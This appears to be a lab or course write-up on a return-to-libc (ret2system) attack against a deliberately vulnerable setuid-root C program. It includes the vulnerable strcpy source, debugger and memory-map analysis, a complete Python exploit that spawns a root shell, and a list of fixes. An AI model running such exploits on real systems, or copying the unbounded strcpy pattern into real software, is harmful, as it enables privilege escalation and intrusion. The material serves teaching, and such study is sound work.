0At a glance

The bug is a classic stack buffer overflow. DEP stops injected shellcode from running, so the exploit reuses code that is already executable: the static binary's own system() function. This is return-to-libc / ret2system.

The exploit in one sentence Send 22 filler bytes, then overwrite the saved return address with system(), then place a fake return address and a pointer to "/bin/sh" directly after it.

1The vulnerable source

The overflow happens in vulnerable() on the strcpy() line. The program calls setuid(0) before reaching that line, so the overflowing copy already runs with root privileges.

target5.c
// Compiled with DEP enabled.
// It's OK if your program crashes after the user exits the shell.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void greetings(void)
{
    system("echo Hello World");
}

void vulnerable(char *arg)
{
    char buf[10];                 // only 10 bytes are reserved logically
    strcpy(buf, arg);             // BUG: copies until NUL, no bounds check
}

int _main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "Error: Need a command-line argument\n");
        return 1;
    }
    setuid(0);                    // <-- gain root BEFORE the overflow
    vulnerable(argv[1]);          // <-- attacker-controlled argument
    greetings();
    return 0;
}
Exploitable issue #1 — unbounded copy into a fixed-size stack buffer strcpy() does not know the size of buf. Every byte after the first 10 keeps writing into whatever is next on the stack: compiler padding, the saved ebp, and finally the saved return address.

Exploitable issue #2 — the saved return address is only 22 bytes away Distance = 0x12 bytes from buf to ebp, plus 4 bytes for the saved ebp itself: 0x12 + 4 = 22. The 10-byte declaration is misleading; the compiler reserved 18 bytes before ebp.

5The overflow: overwriting the return address

6leave; ret → system("/bin/sh")

The function epilogue turns the corrupted stack into a function call. On 32-bit x86, the cdecl calling convention puts the return address at [esp] and the first argument at [esp+4]. That is exactly what the exploit arranges.

What leave does

mov esp, ebp   ; discard locals
pop ebp        ; restore caller's ebp

After leave, esp points at the saved return slot 0xfff6ba4c.

What ret does

pop eip        ; eip = 0x08051520 (system)
               ; esp = 0xfff6ba50

Control jumps to system(). The next stack word becomes the fake return address, and the word after that is the argument.

GDB — at the ret instruction and at system() entry

Why the fake return address is necessary A normal call pushes a return address before entering a function. The exploit uses a plain ret instead, so it must supply that missing word manually. Here it is 0xdeadbeef. When /bin/sh exits, system() returns to 0xdeadbeef and the process segfaults — which is allowed by the assignment.

7Why DEP/NX does not stop this exploit

DEP (Data Execution Prevention), also called NX on Linux, marks writable data such as the stack as non-executable. It stops new shellcode placed on the stack from running. It does not stop a return address from pointing at code that is already executable.

/proc/<pid>/maps while stopped inside vulnerable()

08049000-080b8000 r-xp  /tmp/target5_dbg   # executable code: contains system()
080b8000-080e8000 r--p  /tmp/target5_dbg   # read-only data: contains "/bin/sh"
080e9000-080eb000 r--p  /tmp/target5_dbg
080eb000-080ed000 rw-p  /tmp/target5_dbg   # writable data
080ed000-08110000 rw-p  [heap]
fff6b000-ffffe000 rw-p  [stack]        # writable, NOT executable

Blocked by DEP

# classic shellcode attempt
[stack: rw-p]  inject bytes: 31 c0 ...
ret -> 0xfff6ba36
       CPU: instruction fetch from NX page
       -> SIGSEGV

The CPU refuses to fetch instructions from the stack because the page is not executable.

Allowed despite DEP

# ret2libc / ret2system
ret -> 0x08051520  (system, r-xp)
system arg -> 0x080b884d ("/bin/sh", r--p)
       -> existing executable code runs

The stack is only used as data: addresses and arguments. No instruction is fetched from it.

Non-PIE + static linking = predictable code addresses system() is at 0x08051520 and "/bin/sh" is at 0x080b884d in target5. Because the executable is not PIE, those addresses are fixed even if ASLR is enabled. This exploit therefore does not need a leak and does not depend on environment variables.

8Why the old 20-byte payload segfaulted

The earlier version used 20 filler bytes. That is two bytes short of the saved return address, so the system address straddled the saved EBP and saved EIP. The resulting return address was not system() at all.

9Final payload and the root shell

The final sol5.py prints raw bytes, not text. Those bytes are passed as the single command-line argument to target5.

sol5.py
import sys

# target5 is 32-bit, non-PIE and statically linked (DEP enabled).
# vulnerable(): char buf[10]; strcpy(buf, arg)
# buf is at ebp-0x12, so saved EIP is 0x12 + 4 = 22 bytes from buf.

SYSTEM   = 0x08051520  # nm target5 -> system()
BIN_SH   = 0x080b884d  # virtual address of "/bin/sh"
FAKE_RET = 0xDEADBEEF  # system() returns here after the shell exits

payload = (
    b"A" * 22                            # reach and overwrite saved EIP
    + SYSTEM.to_bytes(4, "little")       # new EIP: system()
    + FAKE_RET.to_bytes(4, "little")     # fake return address for system()
    + BIN_SH.to_bytes(4, "little")       # system("/bin/sh")
)

sys.stdout.buffer.write(payload)
Payload bytes
4141414141414141414141414141414141414141  # 22 × 'A'
20150508                                  # 0x08051520  system()
efbeadde                                  # 0xdeadbeef  fake return
4d880b08                                  # 0x080b884d  "/bin/sh"

10Exploitability checklist

Every item below contributed to the exploit. Removing any one of the first three would make this particular attack much harder or impossible.

  • Unbounded write: strcpy() copies past the 10-byte logical buffer.
  • Reachable return address: saved EIP is only 22 bytes from the start of buf.
  • No stack canary: the corrupted return address is used without an integrity check.
  • DEP/NX gives a false sense of safety: it blocks stack shellcode, but existing system() code is executable.
  • Non-PIE static binary: system() and "/bin/sh" have fixed, known addresses.
  • Privilege before the bug: setuid(0) runs before vulnerable(), so the reused code runs as root.
  • No need for leaks: the payload only uses fixed executable addresses, not stack or environment addresses.

How the code should be fixed

  • Replace strcpy() with a bounded copy such as snprintf(buf, sizeof buf, "%s", arg) or strlcpy().
  • Compile with stack-protector (canary) enabled for defense in depth.
  • Build as PIE so code addresses are randomized, and keep ASLR enabled.
  • Drop privileges permanently after the privileged operation instead of leaving root privileges live across the vulnerable call.
  • Keep NX/DEP enabled — it still raises the cost by forcing code-reuse attacks such as this one.
Key takeaway DEP prevents executing new instructions from the stack. It does not prevent an attacker from changing where existing instructions are called. That is why return-to-libc / ret2system still works.
